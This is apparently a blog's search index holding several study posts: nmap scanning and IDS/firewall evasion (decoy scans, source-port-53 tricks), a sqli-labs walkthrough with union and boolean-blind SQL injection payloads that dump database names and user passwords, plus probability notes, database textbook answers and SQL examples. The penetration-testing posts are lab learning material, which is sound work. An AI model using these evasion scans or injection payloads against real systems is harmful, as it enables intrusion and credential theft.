这些脚本用于检查服务是否存在拒绝服务漏洞，由于它会损害服务，因此使用较少。 exploit 此类脚本尝试利用扫描端口的已知漏洞。 external 使用外部服务进行进一步处理的脚本。 fuzzer 这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。 intrusive 可能对目标系统产生负面影响的侵入性脚本。 malware 检查某些恶意软件是否感染了目标系统。 safe 不执行侵入性和破坏性访问的防御脚本。 version 服务检测的扩展。 vuln 识别特定的漏洞。 默认脚本 -sC\n特定脚本类型\u0026ndash;script 定义脚本 \u0026ndash;script ,\nNmap - Aggressive Scan -A 1 sudo nmap 10.129.2.28 -p 80 -A -A 执行服务检测、操作系统检测、跟踪路由并使用默认脚本扫描目标。 发现了系统上运行着哪种 Web 服务器,使用了哪种 Web 应用程序，以及网页的标题 。 漏洞评估 --script vuln 使用指定类别的所有相关脚本。 防火墙和IDS/IPS规避 TCP SYN扫描又称“半开扫描”。回顾TCP连接的三次握手，申请方首先发送的是一个SYN数据包，服务方在接到这个SYN数据包后，如果该端口处于侦听状态，则会回复一个SYN|ACK的数据包；如果该端口没有处于侦听状态，则会回复一个RST的数据包。而此时如果对方处于侦听状态，申请方还需要再向对方回复一个ACK数据包以示建立连接。此时对方就认为连接建立，并记入日志。\n无论服务方回复SYN|ACK的数据包，还是回复RST的数据包，申请方其实已经能够判断对方端口是否为“开”的状态。之后的ACK数据包发送则被对方监视，如果此时不发送ACK数据包，而是发一个RST数据包，则不仅关闭了这个未完成的连接过程，并且也会因为连接未建立而不会被对方记录。这种扫描方式因为使用了SYN标志位，所以被称为TCP SYN扫描。这种扫描技术的优点在于一般不会在目标计算机上留下记录，有时即使在用netstat命令也显示不出来；但这种方法的一个缺点是必须要有管理员权限才能建立自己的SYN数据包。\n使用诱饵扫描 Nmap 会生成插入到 IP 标头中的各种随机 IP 地址，以掩盖发送的数据包的来源。使用此方法，我们可以随机生成 ( RND) 个特定数量（例如：5）的 IP 地址，并以冒号 ( :) 分隔。然后，我们的真实 IP 地址会随机放置在生成的 IP 地址之间\n1 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 80 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -D RND:5 生成五个随机 IP 地址，指示连接来自的源 IP。 DNS 代理 过滤端口的 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace 从 DNS 端口进行 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 现在我们已经发现防火墙接受了TCP port 53，因此很可能 IDS/IPS 过滤器的配置也比其他过滤器弱得多。我们可以通过使用 尝试连接到此端口来测试这一点Netcat。\n扫描选项 描述 10.129.2.28 扫描指定目标。 -p 50000 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 --source-port 53 从指定的源端口执行扫描。 连接到过滤端口 1 ncat -nv --source-port 53 10.129.2.28 50000 ","date":"2025-01-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nmap%E5%9F%BA%E7%A1%80/","title":"nmap基础"},{"content":" 工具：phpstudy，Hackbar 搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马) 数据库：mysql5.7 联合注入 需要页面有回显位\n查找注入点\n判断使字符型还是数字型注入id=2-1\n如果是字符型，找到闭合方式，‘，“，’)\n判断查询列数，order by\n查询回显位置，同时将原先的查询id注释掉\n拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来\nless-1 判断是否存在sql注入\n\u0026ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管\n1 ?id=1\u0026#39; order by 3--+ 显示正常\n1 ?id=1\u0026#39; order by 4--+ 报错\n得知less-1共有三列，爆出显示位\n1 ?id=1\u0026#39; union select 1,2,3--+ 在mysql里面尝试union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ 使id=-1报错注释，页面显示正常\n获取数据名\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ 中间省略了一些过程详见less-2\n查询用户名和密码\n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 判断为数字型，页面改变\n1 ?id=2-1 ？id=2 三列\n1 ?id=1 order by 3 闭合方式为‘\n1 ?id=1\u0026#39; order by 3 爆数据名\n1 ？id=-1 union select 1,database(),version() 爆表名\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; 爆列名\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 与前两关不同的地方是闭合方式\n1 ?id=1\u0026#39; 单引号加括号，后续一律以?id=1\u0026rsquo;)开头，和上面同\nless-4 判断得知闭合方式双引号加括号\n1 /?id=2\u0026#34; 布尔盲注 页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小\n判断得知闭合方式为'\n二分法判断数据库长度 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //不显示 ?id=1\u0026#39; and length(database())\u0026gt;5--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;7--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;8--+ //不显示 得知database（）长度为8\n二分法利用ASCII码判断字符 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //不显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //不显示 得知第一个字符ASCII码为115，即“s”\n依次判断8个字符，知当前数据库为security\n判断当前数据库的表 判断是否存在admin表\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 判断表的个数 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //正常显示 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //不显示 逐一判断表名字符长度 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ 逐一判断表名字符的ASCII码 1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ 存在emails,referers,uagents,users\n对column执行相同的操作，where语句修改 1 where table_name = \u0026#39;users\u0026#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长 得知users中有三个字段id,username,password\n判断字段长度 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ 判断字段ASCII值 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labs通关"},{"content":"记号\n如果$n_1+n_2+\\cdots+n_r=n$, 则定义$\\binom n{n_1,n_2,\\ldots,n_r}$为 $$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$因此，$\\binom n{n_1,n_2,\\ldots,n_r}$表示把 $n$ 个 不 同 的 元 素 分 成 大 小 分 别 为 $n_1, n_2, \\ldots , n_r$的$r$个\n不同组的组合数. 例 5e 假设有$n+m$个球，其中$n$个红的，$m$个蓝的，将它们随机排成一排，即所$(n+m)!$种排列都是等可能的. 如果只记录连续排列的球的颜色，证明各种可能的结果概率是一样的. 解 我们将$(n+m$)个球的次序排列称为一组球的排列，将 $n+m$ 个球的颜色次序排称为一组球的颜色次序排列. 球的排列共有($n+m$)!种，在红球之间作任何一个位于换，在蓝球之间作任何一个位置置换，置换的结果并不影响球的颜色次序排列. 从而组球的颜色次序排列，对应于$n!m!$个球的排列，这说明球的次序排列也是等可能的且每一种颜色次序出现的概率为$n!m!/(n+m)!.$\n多项式定理\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$上式的求和号是对满足 $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ 的所有非负整数向量($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$求和.\n命题 6.1 共有$\\binom{n-1}{r-1}$个不同的正整数向量$(x_1,x_2,\\cdots,x_r)$满足 为了得到非负整数解(而不是正整数解)的个数，注意，$x_1+x_2+\\cdots+x_r=n$的非负整数解个数与$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$的正整数解个数是相同的(令$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ 因此，利用命题 6.1,可得到如下命题。\n生日问题 如果房间里有$n$个人，那么没有两人的生日是同一天的概率是多大？当$n$多大 时，才能保证此概率小于1/2? 解 每个人的生日都有 365 种可能，所以$n$个人一共是 365\u0026quot; 种可能(此处忽略有人生日是 2月 29 日的可能性). 假定每种结果的可能性都是一样的，那么所求事件的概率为$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$令人惊奇的是，一旦$n\\geqslant23$,这个概率就比1/2要小. 即房间里人数如果超过 23 的话，那么至少有两人为同一天生日的概率就大于 1/2. 很多人一开始对这个结果很吃惊，因为 23 相对于一年 365 天来说太小了.然而，对每两个人来说，生日相同的概率为$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23个人一共可以组成$\\binom{23}2=253$ 对，这样来看上述结果似乎就不再令人吃惊了.\n配对问题 假设有 N 位男士参加舞会，所有人都将帽子扔到房间中央混在一 起，然后每人再随机拿一顶帽子.所有人都没有拿到自己帽子的概率是多少？ 解 先计算至少有一人拿到自己的帽子的概率.令$E_i(i=1,2,\u0026hellip;,N)$表示事件“第$i$ 人拿到了自己的帽子”.这样，由命题 4.4,至少有一人拿到了自己的帽子的概率为：\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"概率论模型及小结"},{"content":"第二章 关系数据库 1.试述关系模型的三个组成部分\n关系数据结构：只包含单一的数据结构——关系，由三种类型：基本关系（基本表），查询表和视图表\n关系操作集合：查询（选择，投影，并，差，笛卡尔积），插入，删除，修改\n关系完整性约束\n2.关系数据语言的特点和分类\n(1)关系代数语言 (2)关系演算语言：元组关系演算语言和域关系演算语言 (3)SQL：具有关系代数和关系演算双重特点的语言\n3.解释术语，说明关系与联系\n（1）域：一组具有相同数据类型的值的集合\n（2）笛卡尔积：给定一组域D1,D2,\u0026hellip;,Dn,D1×D2×\u0026hellip;×Dn={(d1,d2,\u0026hellip;,dn),di∈Di}\n（3）关系：D1×D2×\u0026hellip;×Dn（笛卡尔积）的有限子集，表示为R（D1,D2,D3,\u0026hellip;,Dn），n=1，一元关系，n=2，二元关系，也是一张二维表\n（4）元组：笛卡尔积中每一个元素{(d1,d2,\u0026hellip;,dn),di∈Di}，一个n元组\n（5）属性：在二维表中，是一列，n目关系有n个属性（列）\n（1）主码：从多个候选码中选定一个作为主码\n（2）候选码：某一属性组的值额能唯一的标识一个元组，而其子集不能\n（3）外码：关系R中的一个属性F并不是R的码，但对应另一个关系S中的主码Ks，F称为R和S的外码，定义在同一个域上\n（1）关系模式（型）：关系的描述，R（U,D,DOM,F)，R为关系名，U为属性名集合，D为属性来自的域，DOM为属性向域的映像集合（如属性的类型，长度\n（2）关系（值）：包括基本关系（基本表），查询表，视图表\n（3）关系数据库：所有关系的集合\n4.举例说明关系模式和关系的联系\n关系是关系模型在某一时刻的状态或内容，关系模式是静态的，稳定的，关系是动态的，随时间不断变化的。\n5.试述关系模型的完整性规则。在参照完整性中，说明情况下外码属性的值可以为空值\n实体完整性：主属性不能去空值（null）\n参照完整性：两个关系之间存在着属性的引用，如学生的学号取值需要参照专业关系中的专业号\n用户定义的完整性：应用领域需要遵循的约束条件，语义约束\n在参照完整性规则中，外码属性的值可以取空值只有当外码的每个属性值取空值（二维表中每一列都是NULL）\n6.试述等值连接与自然连接的区别和联系\n自然连接是一种特殊的等值连接，，自然连接取消重复列\n7.关系代数的基本运算\n传统的集合运算：二目运算，包括并，差，交，笛卡尔积\n专门的关系运算：选择，投影，连接（查询就是一个关系在属性上的投影，取消某些列和重复元组），除运算\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第二章习题答案"},{"content":"第一章 绪论 1.试述数据，数据库，数据库管理系统，数据库系统的概念\n数据：描述事物的符号 数据库DB：长期储存在计算机内，有组织的，可共享的大量数据的集合。数据库中的数据按一定的数据模型组织，描述和储存，具有较小的冗余度，较高的数据独立性和易扩展性，并可为各种用户共享 数据库管理系统DBMS：系统软件，有以下功能： 数据定义 数据组织，存储和管理 数据操纵功能 数据库的事务管理和运行管理 数据库建立和维护 数据库系统DBS：由DB，DBMS,DA组成的存储，管理，处理和维护数据的系统 2.使用数据库有什么好处？\n数据结构化：整体和内部\n数据的共享性高，冗余度低且易扩展：大大减少数据冗余，节约存储空间，避免数据之间的不相容性与不一致性\n数据独立性高：\n物理独立性，用户的应用程序与数据库中数据库数据的物理存储相互独立 逻辑独立性：用户的应用程序与数据库的逻辑结构是相互独立 数据由数据库管理系统统一管理和控制\n数据的安全性保护：保护数据以防止不合法使用造成的数据泄密和破坏 数据的完整性检查：数据的正确性，有效性和相容性 用户可以并发控制 数据库恢复功能：比如说rollback 3.试述文件系统与数据库系统的区别和联系\n见P7表1.1\n6.数据库管理系统的主要功能\n在数据库建立，运用和维护时对数据库进行统一控制，以保证数据的完整性和安全性，并在多用户同时使用数据库时进行并发控制，在发生故障后对数据库进行恢复\n7.什么是概念模型？试述概念模型的作用\n信息模型，按用户的观点对数据和信息建模，主要用于数据库设计，用于信息世界的建模\n8.定义并解释概念模型中以下术语：\n实体：客观存在并可相互区别的事物。如具体的人，事，物，抽象的概念或联系\n实体型：用实体名及其属性名集合来抽象和刻画同类实体，如学生（学生号，姓名，性别，所在院系\u0026hellip;)\n实体集：同一类型实体的集合。例如，全体学生就是一个实体集\n实体之间的联系：或称不同实体集之间的联系\n9.试述数据模型的概念，数据模型的作用和数据模型的三个要素\n对现实世界数据特征的抽象，用来描述数据，组织数据和对数据进行操作\n比较真实地模拟现实世界 容易为人所理解 便于在计算机上实现 10.试述层次模型的概念，举出三个实例\n有且只有一个结点没有双亲结点（根节点），根以外的其他结点有且只有双亲结点，实例：行政结构，家族关系，生物分类学，电脑文件系统\n11.试述网状模型的概念，举出三个实例\n允许一个以上的结点无双亲，一个结点可以有多于一个的双亲，如互联网，社交网络，地铁交通网络\n12.试述层次，网状模型的优缺点\n层次模型的优点：\n数据结构简单清晰 数据库的查询效率高 层次数据模型提供了良好的完整性支持 层次模型的缺点：\n现实世界中很多联系是非层次性的 如果一个结点具有多个双亲结点等，不便于用层次模型表示联系 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 网状模型的优点：\n能够更为直接地描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系 具有良好地性能，存取效率较高 网状模型的缺点：\n结构过程比较复杂 网状模型的DDL,DML复杂，需要嵌入语言 记录之间的联系通过存取路径实现，应用程序在访问数据时候必须选择适当的存取路径，用户必须了解系统结构的细节，加重了应用程序的负担 13.试述关系模型的概念，定义并解释以下术语\n关系模型由一组关系组成，每个关系的数据结构都是一张规范化的二维表。\n元组：表中的一行即为一个元组\n属性：表中的一列即为一个属性\n关系：一个关系对应以一张表\n码：某个可以唯一确定一个元组的属性组，如学生的学号\n域：一组具有相同数据类型的值的集合，如性别的域是{男，女}，大学生奈年龄属性的域是（15，45）\n分量：元组中的一个属性值\n14.试述关系数据库的特点\n规范化，即关系的每一个分量必须是一个不可分的数据项\n关系模型与格式化模型不同，建立在严格的数学概念的基础上\n概念单一，实体间的联系，对数据的检索和更新也是关系（Table），数据结构简单清晰\n存取路径透明，更高的数据独立性，更好的安全保密性，简化程序员的工作，但查询效率较低\n** 在计算机中，从某个角度*看不到的特性称该特性是透明的*。这个意义上的“透明”与社会生活中的透明含义*恰好相反*，例如计算机组织对程序员是透明的，就是说计算机组织对程序员来说是看不到的，也不需要看到的。*和汉语字典里面的意思不一样。 ***\n15，试述数据库系统的三级模式结构，并说明优点\n外模式，模式，内模式\n外模式：子模式或用户模式，数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示\n内模式：存储模式，数据物理结构和存储方式的描述，是数据在数据库内部的组织方式\n模式：逻辑模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只有一个模式\n使用户能够逻辑的，抽象的处理数据，而不必关心数据在计算机中的具体表示方式与存储方式\n17.什么叫数据与程序的物理独立性？数据与程序的逻辑独立性？为什么数据库由数据与程序的独立性？\n物理独立性：当数据库的存储结构改变时，由数据库管理员对模式/内模式映像作响应改变\n逻辑独立性：当模式改变时，由数据库管理员对各个外模式/模式的影响作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。\n数据与程序之间的独立性使得数据的定义和描述可以从应用程序中分离出去。由于数据的存储由数据库管理系统管理，从而简化了应用程序的编制，大大减少了应用程序的维护和修改。\n18.试述数据库系统的组成\n数据库，数据库管理系统，应用程序和数据库管理员\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第一章习题答案"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --右边取消空格 RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --大写 AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --近似发音 SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --取平均值 FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --对所有行计数 FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --组合聚集函数 FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--过滤分组，group by 和 having结合 SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--检索包含三个或更多物品的订单号和订购物品的数目 ORDER BY items,order_num;--按订购物品的数目排序输出，having在group by前，order by后 SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--建立以上的子查询，由内向外 SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --子查询对检索出的每个顾客执行一次，用句点避免混淆列名 FROM Customers ORDER BY cust_name;--对于检索出的每个顾客，统计其在Orders表中的订单数目 SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--设置主键，DBMS默认主键基本不修改或更新，不能重用 ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--将此表中的cust_id设置为Customers的主键，即外键。外键有助防止意外删除，若删除，级联删除 CREATE INDEX prod_name_ind--索引名 ON Products(prod_name)--被索引的表，列 CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--创建一个触发器，对所有INSERT和UPDATE操作，将cust_state转为大写 ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQL必知必会例子"},{"content":"Python 爬虫 建模 数据挖掘（统计方向的待定） JS 做个代办事项列表（我所能想到JS对我的唯一用处就是网页加个响应什么的）\n重新巩固C语言 Unity 学习C#语言，可能大创写个游戏，或者跟之前联系好的设计系朋友写着玩玩\nLeetcode 刷题周赛 算法与数据结构 算是提前预习大三内容，以及体验下朋友所说的算法addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu_f5523af80b8f11a1.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python 基础语法到面向对象编程，小项目只用过pygame写了一个窗口射击游戏，图灵系列那本python编程学的很流畅，很快能上手项目\nJavascript 到现在只学了点皮毛，只会做动态内容更新，也只是自己做html网页时乱加上去的\nLinux 一开始甚至打算买个电脑重装Linux，看到无数人因为Linux整个大学没敲几行代码被劝退了，最后只学了Bash，但是和windows的shell不兼容，用的乌班图版本，以下是我试过的所有办法：\n虚拟盘开机和Windows双系统 虚拟机如virtualbox和Vmware（据说可以申请阿里云学生服务器，但我用的前者） Windows自带wsl，最后自己搞了个图形化界面，甚至现在偶尔还在用 工具 Vim：很容易上手，但不常用就会很快忘了（谁没事会在shell里面编辑文本） Nano：可读性比Vim强，但我已经习惯Vim了 SSH Docker Git：最重要的一个，不用多说 数据库 学校课程，但反而很不上心，明天开始重学\nCS常识 b站有个做的很好的科普视频，会放在Resource里面\nHtml 严格来说，太简单算不上编程语言\nCSS 之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库\u0026hellip;\u0026hellip;\n数学分析3，概率论 前者太难听不懂，后者太简单不想听\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu_95a0bebc19439f13.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"第三章 SQL 1.试述SQL的特点\n综合统一，高度非过程化，面向集合的操作方式，以同一种语法结构提供多种使用方式\n2.说明在DROP TABLE时，RESTRICT和CASCADE的区别\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]